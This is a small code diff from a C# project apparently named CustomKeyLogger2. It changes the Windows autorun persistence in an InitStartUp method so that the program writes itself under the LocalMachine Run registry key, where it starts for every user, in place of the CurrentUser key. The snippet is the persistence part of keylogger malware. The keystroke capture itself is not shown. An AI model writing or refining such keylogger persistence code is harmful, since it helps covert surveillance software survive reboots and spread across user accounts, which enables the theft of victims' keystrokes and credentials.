@@ -117,7 +117,7 @@ namespace CustomKeyLogger2
 
         private void InitStartUp()
         {
-            RegistryKey regKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            RegistryKey regKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
             string result = (string)regKey.GetValue(Application.ProductName, "NotFound");
             if (result != Application.ExecutablePath)
             {
